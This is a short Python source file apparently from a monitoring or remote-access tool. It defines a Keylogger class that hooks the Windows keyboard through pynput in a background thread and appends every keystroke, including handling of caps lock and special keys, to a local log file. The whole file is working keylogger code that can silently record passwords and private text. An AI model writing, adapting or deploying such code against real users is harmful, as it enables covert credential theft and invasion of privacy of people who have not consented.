from pynput.keyboard import Listener, Key
import os, ctypes, threading

class Keylogger:
    def __init__(self):
        self.path = os.path.join(os.path.dirname(__file__), "cache\\keylog.txt")
        self.caps = ctypes.windll.user32.GetKeyState(0x14) & 0x0001 != 0
        self.hooked = None

        self.clear()

    def print(self):
        with open(self.path, "r") as f:
            return f.read()

    def clear(self):
        with open(self.path, "w") as f:
            f.write("")

    def hook(self):
        if self.hooked:
            return

        def on_press(key):
            if not self.hooked:
                return False

            with open(self.path, "a") as f:
                if key == Key.caps_lock:
                    self.caps = not self.caps
                elif key == Key.space:
                    f.write(" ")
                elif key == Key.shift or key == Key.shift_r:
                    pass
                elif key == Key.enter:
                    f.write("Enter\n")
                else:
                    key_str = str(key)

                    if key_str == "\'\"\'":
                        key_str = "\""
                    elif key_str == "\"\'\"":
                        key_str = "\'"
                    elif "\\\\" in key_str:
                        key_str = "\\"
                    else:
                        key_str = key_str.replace("'", "")

                    if len(key_str) == 1 and self.caps:
                        key_str = key_str.swapcase()
                    elif key_str.startswith("Key."):
                        key_str = key_str[4:].capitalize()

                    f.write(key_str)

        def listen():
            with Listener(on_press=on_press) as listener:
                listener.join()

        self.hooked = threading.Thread(target=listen)
        self.hooked.start()

    def unhook(self):
        self.hooked = None
